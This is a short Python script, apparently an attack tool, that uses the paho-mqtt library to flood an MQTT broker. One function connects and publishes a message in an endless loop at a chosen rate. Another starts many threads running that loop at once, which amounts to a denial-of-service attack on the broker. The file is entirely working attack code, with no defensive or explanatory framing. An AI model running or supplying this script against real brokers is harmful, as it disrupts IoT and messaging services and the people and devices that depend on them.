import threading
import time
import paho.mqtt.client as mqtt

def launch_attack_P(broker, port, topic, message, rate):
    client = mqtt.Client()
    client.connect(broker, port, keepalive=60)

    while True:
        client.publish(topic, message)
        time.sleep(1/rate)

def start_attack(broker, port, topic, message, rate, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=launch_attack_P, args=(broker, port, topic, message, rate))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
